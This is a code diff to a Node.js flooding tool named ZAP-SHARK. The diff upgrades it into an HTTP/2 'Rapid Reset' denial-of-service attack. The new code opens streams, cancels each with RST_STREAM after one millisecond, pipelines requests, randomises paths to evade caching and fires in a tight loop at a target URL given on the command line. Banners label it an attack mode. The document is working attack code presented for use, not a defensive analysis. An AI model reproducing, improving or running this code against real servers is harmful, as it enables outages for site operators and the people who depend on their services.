@@ -13,11 +13,16 @@ class ZAPSHARK {
         this.lastRpsCalc = Date.now();
         this.running = true;
         
-        // MAX H2 ABUSE - CAREFUL OPTIMIZATION
+        // RAPID RESET CONFIG
         this.connectionPool = [];
-        this.poolSize = 5; // Multiple connections for true multiplexing
+        this.poolSize = 3; // Reduced - rapid reset needs fewer connections
         this.activeStreams = 0;
-        this.maxStreamsPerConn = 100;
+        this.maxStreamsPerConn = 1000; // H2 server limit
+        this.resetDelay = 1; // ms to wait before RST_STREAM
+        
+        // PIPELINING
+        this.pipelineDepth = 50; // Requests in flight per connection
+        this.pipelineQueue = [];
         
         // Maintenance
         this.lastMaintenance = Date.now();
@@ -27,71 +32,98 @@ class ZAPSHARK {
         this.attackInterval = null;
     }
 
-    setupConnections() {
-        // Create multiple H2 connections carefully
+    async setupConnections() {
         for (let i = 0; i < this.poolSize; i++) {
-            setTimeout(() => {
-                try {
-                    const client = http2.connect(this.targetUrl);
-                    client.setMaxListeners(100);
-                    
-                    client.on('error', () => {
-                        // Silent fail - don't spam reconnects
-                    });
-                    
-                    client.on('remoteSettings', (settings) => {
-                        if (settings.maxConcurrentStreams) {
-                            this.maxStreamsPerConn = Math.min(settings.maxConcurrentStreams, 100);
-                        }
-                    });
-                    
-                    this.connectionPool.push(client);
-                } catch (err) {
-                    // Don't break on connection errors
-                }
-            }, i * 100); // Stagger connections
+            try {
+                const client = http2.connect(this.targetUrl, {
+                    maxSessionMemory: 65536,
+                    maxDeflateDynamicTableSize: 65536,
+                    peerMaxConcurrentStreams: 1000,
+                    settings: {
+                        initialWindowSize: 6291456, // Max window size
+                        maxConcurrentStreams: 1000,
+                        maxFrameSize: 16384
+                    }
+                });
+                
+                client.setMaxListeners(1000);
+                
+                // Track connection for pipelining
+                client._pendingStreams = 0;
+                client._pipelineQueue = [];
+                
+                client.on('remoteSettings', (settings) => {
+                    if (settings.maxConcurrentStreams) {
+                        this.maxStreamsPerConn = Math.min(settings.maxConcurrentStreams, 1000);
+                    }
+                });
+                
+                this.connectionPool.push(client);
+                
+                await new Promise(r => setTimeout(r, 50));
+                
+            } catch (err) {
+                // Silent fail
+            }
         }
     }
 
-    sendRequest() {
+    sendRapidReset() {
         if (this.connectionPool.length === 0) return;
 
-        // Use available connections carefully
-        const availableStreams = (this.maxStreamsPerConn * this.connectionPool.length) - this.activeStreams;
-        const streamsThisTick = Math.min(availableStreams, 3); // Conservative multiplexing
-        
-        for (let i = 0; i < streamsThisTick; i++) {
-            const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
-            if (!client) continue;
-
-            try {
+        for (const client of this.connectionPool) {
+            if (client.destroyed) continue;
+            
+            // PIPELINING: Send multiple requests before any responses
+            const streamsToCreate = Math.min(
+                this.pipelineDepth - client._pendingStreams,
+                this.maxStreamsPerConn - this.activeStreams
+            );
+            
+            for (let i = 0; i < streamsToCreate; i++) {
                 this.activeStreams++;
+                client._pendingStreams++;
                 
-                const req = client.request({
-                    ':method': 'GET',
-                    ':path': '/'
-                });
-                
-                req.on('response', () => {
-                    req.destroy();
-                });
-                
-                req.on('error', () => {
-                    req.destroy();
-                });
-                
-                req.on('close', () => {
+                try {
+                    const req = client.request({
+                        ':method': 'GET',
+                        ':path': '/?' + Math.random(),
+                        ':authority': new URL(this.targetUrl).hostname,
+                        'user-agent': 'Mozilla/5.0',
+                        'accept': '*/*'
+                    });
+                    
+                    // RAPID RESET: Cancel immediately
+                    setTimeout(() => {
+                        try {
+                            // Send RST_STREAM frame (cancellation)
+                            req.close(http2.constants.NGHTTP2_CANCEL);
+                            // Alternative: destroy stream
+                            req.destroy();
+                        } catch (err) {
+                            // Stream already closed
+                        }
+                        this.activeStreams--;
+                        client._pendingStreams--;
+                        
+                        // COUNT IT
+                        this.totalRequests++;
+                        this.requestsSinceLastCalc++;
+                    }, this.resetDelay);
+                    
+                    req.on('error', () => {});
+                    req.on('close', () => {
+                        client._pendingStreams--;
+                    });
+                    
+                    req.end();
+                    
+                } catch (err) {
                     this.activeStreams--;
+                    client._pendingStreams--;
                     this.totalRequests++;
                     this.requestsSinceLastCalc++;
-                });
-                
-                req.end();
-                
-            } catch (err) {
-                this.activeStreams--;
-                this.totalRequests++;
-                this.requestsSinceLastCalc++;
+                }
             }
         }
     }
@@ -119,7 +151,8 @@ class ZAPSHARK {
         
         process.stdout.write(`\rZAP-SHARK: (${this.formatRuntime()}) | (${this.status}) ` +
                            `TOTAL: ${this.totalRequests} | ` +
-                           `RPS: ${this.currentRPS.toFixed(1)}`);
+                           `RPS: ${this.currentRPS.toFixed(1)} | ` +
+                           `RR: ${this.pipelineDepth}x`);
     }
 
     flushDNS() {
@@ -131,13 +164,10 @@ class ZAPSHARK {
     }
 
     flushSockets() {
-        // Carefully close all connections
         this.connectionPool.forEach(client => {
             try {
                 client.destroy();
-            } catch (err) {
-                // Ignore cleanup errors
-            }
+            } catch (err) {}
         });
         this.connectionPool = [];
         this.activeStreams = 0;
@@ -172,39 +202,34 @@ class ZAPSHARK {
             clearInterval(this.attackInterval);
         }
         
+        // AGGRESSIVE TIMING FOR RAPID RESET
         this.attackInterval = setInterval(() => {
             if (this.status === "ATTACKING") {
-                this.sendRequest();
+                this.sendRapidReset();
                 this.updateDisplay();
             }
-        }, 0.1);
+        }, 0.01); // 100 calls per second
     }
 
-    start() {
+    async start() {
         this.lastMaintenance = Date.now();
         
-        console.log("=== ZAP-SHARK MAX H2 ===");
+        console.log("=== ZAP-SHARK RAPID RESET EDITION ===");
         console.log("Target:", this.targetUrl);
-        console.log("=".repeat(40));
+        console.log("Mode: H2 Rapid Reset + Pipelining");
+        console.log("Pipeline Depth:", this.pipelineDepth);
+        console.log("Reset Delay:", this.resetDelay + "ms");
+        console.log("=".repeat(50));
         
-        this.setupConnections();
+        await this.setupConnections();
         
-        // Wait for connections to establish
         setTimeout(() => {
             this.startAttack();
         }, 2000);
         
-        // Maintenance checker
         setInterval(() => {
             this.checkMaintenance();
         }, 1000);
-        
-        // Connection health check - careful replenishment
-        setInterval(() => {
-            if (this.connectionPool.length < this.poolSize && this.status === "ATTACKING") {
-                this.setupConnections();
-            }
-        }, 10000);
         
         process.on('SIGINT', () => {
             this.running = false;
@@ -216,10 +241,10 @@ class ZAPSHARK {
     }
 }
 
-// Safe usage
+// Usage
 const target = process.argv[2];
 if (!target || !target.startsWith('https://')) {
-    console.log('Usage: node zap-shark.js https://target.com');
+    console.log('Usage: node zap-shark-rr.js https://target.com');
     process.exit(1);
 }
 
